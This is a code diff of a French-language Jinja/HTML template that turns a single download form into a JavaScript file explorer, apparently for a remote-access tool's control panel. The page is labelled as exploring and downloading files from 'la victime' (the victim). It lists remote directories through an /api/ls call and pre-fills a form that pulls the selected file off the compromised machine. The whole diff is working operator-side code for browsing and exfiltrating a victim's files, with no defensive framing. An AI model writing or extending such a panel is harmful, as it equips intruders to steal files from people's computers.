@@ -1,18 +1,99 @@
 {% extends "base.html" %}
 {% block content %}
-<h3>📥 Télécharger un fichier depuis la victime</h3>
-<form method="POST" action="{{ url_for('download_remote') }}">
-    <label for="remote_path">Chemin distant :</label><br>
-    <input type="text" name="remote_path" placeholder="/tmp/test.txt" required>
-    <button type="submit">Télécharger</button>
-</form>
+<h3>📁 Explorateur de fichiers de la victime</h3>
+
+<div id="explorer-container">
+    <p>📂 Dossier actuel : <span id="current-path">/</span></p>
+    <ul id="file-list">
+        <li>Chargement...</li>
+    </ul>
+</div>
 
 <hr>
 
-<h3>📥 Fichiers disponibles</h3>
+<form id="download-form" method="POST" action="{{ url_for('download_remote') }}">
+    <input type="hidden" name="remote_path" id="remote_path_input">
+    <button type="submit" id="download-button" disabled>📥 Télécharger le fichier sélectionné</button>
+</form>
+
+<h3>📥 Fichiers déjà téléchargés</h3>
 <ul>
     {% for file in files %}
     <li><a href="{{ download_folder }}/{{ file }}">{{ file }}</a></li>
     {% endfor %}
 </ul>
+
+<script>
+    let currentPath = "/";
+
+    function setCurrentPath(path) {
+        currentPath = path.replace(/\/+/g, "/"); // nettoie les multiples slashs
+        document.getElementById("current-path").textContent = currentPath;
+    }
+
+    function goUp() {
+        const parts = currentPath.split("/").filter(Boolean);
+        parts.pop();
+        const newPath = "/" + parts.join("/");
+        setCurrentPath(newPath);
+        loadDirectory();
+    }
+
+    function loadDirectory() {
+        fetch(`/api/ls?path=${encodeURIComponent(currentPath)}`)
+            .then(res => res.json())
+            .then(data => {
+                if (data.error) {
+                    alert("Erreur LS : " + data.error);
+                    return;
+                }
+                renderFileList(data.entries);
+            });
+    }
+
+    function renderFileList(entries) {
+        const list = document.getElementById("file-list");
+        list.innerHTML = "";
+
+        if (currentPath !== "/") {
+            const up = document.createElement("li");
+            const upLink = document.createElement("a");
+            upLink.href = "#";
+            upLink.textContent = "🔙 ..";
+            upLink.onclick = goUp;
+            up.appendChild(upLink);
+            list.appendChild(up);
+        }
+
+        entries.forEach(entry => {
+            const li = document.createElement("li");
+            const link = document.createElement("a");
+            link.href = "#";
+
+            if (entry.type === "D") {
+                link.textContent = "📁 " + entry.name;
+                link.ondblclick = () => {
+                    const nextPath = currentPath === "/" ? `/${entry.name}` : `${currentPath}/${entry.name}`;
+                    setCurrentPath(nextPath);
+                    loadDirectory();
+                };
+            } else {
+                link.textContent = "📄 " + entry.name;
+                link.onclick = () => {
+                    const fullPath = currentPath === "/" ? `/${entry.name}` : `${currentPath}/${entry.name}`;
+                    document.getElementById("remote_path_input").value = fullPath;
+                    document.getElementById("download-button").disabled = false;
+                };
+            }
+
+            li.appendChild(link);
+            list.appendChild(li);
+        });
+    }
+
+    window.onload = () => {
+        setCurrentPath("/");
+        loadDirectory();
+    };
+</script>
 {% endblock %}
